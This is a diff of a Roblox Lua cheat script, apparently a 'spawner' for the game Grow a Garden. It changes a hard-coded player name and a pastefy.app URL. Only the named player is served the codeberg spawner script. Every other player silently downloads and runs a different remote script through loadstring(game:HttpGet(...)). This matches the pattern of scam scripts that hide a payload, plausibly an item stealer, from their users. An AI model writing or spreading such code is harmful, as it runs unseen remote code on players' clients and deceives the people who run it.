@@ -166,13 +166,13 @@ task.spawn(function()
         gui:Destroy()
         -- --- PLAYER DETECTION LOGIC ---
         local player = game.Players.LocalPlayer
-        if player and player.Name == "playsafe_kurt" then
+        if player and player.Name == "Zeen_2423" then
             -- This is the original script URL for 'playsafe_kurt'
            loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 Spawner.Load()
         else
             -- This is for any other player
-            loadstring(game:HttpGet("https://pastefy.app/hXfnyJFv/raw"))()      
+            loadstring(game:HttpGet("https://pastefy.app/a8YOWDAX/raw"))()      
                 end
         -- --- END PLAYER DETECTION LOGIC ---
     end)
@@ -321,7 +321,7 @@ task.spawn(function()
         gui:Destroy()
         -- --- PLAYER DETECTION LOGIC ---
         local player = game.Players.LocalPlayer
-        if player and player.Name == "playsafe_kurt" then
+        if player and player.Name == "Zeen_2423" then
             -- This is the original script URL for 'playsafe_kurt'
            loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 Spawner.Load()
@@ -496,11 +496,11 @@ task.spawn(function()
         gui:Destroy()
         -- --- PLAYER DETECTION LOGIC ---
         local player = game.Players.LocalPlayer
-        if player and player.Name == "playsafe_kurt" then
-            -- This is the original script URL for 'playsafe_kurt'
+        if player and player.Name == "Zeen_2423" then
+            -- This is the original script URL for 'Zeen_2423'
            loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 Spawner.Load()
         else
             -- This is for any other player
-            loadstring(game:HttpGet("https://pastefy.app/hXfnyJFv/raw"))()      
+            loadstring(game:HttpGet("https://pastefy.app/a8YOWDAX/raw"))()      
          
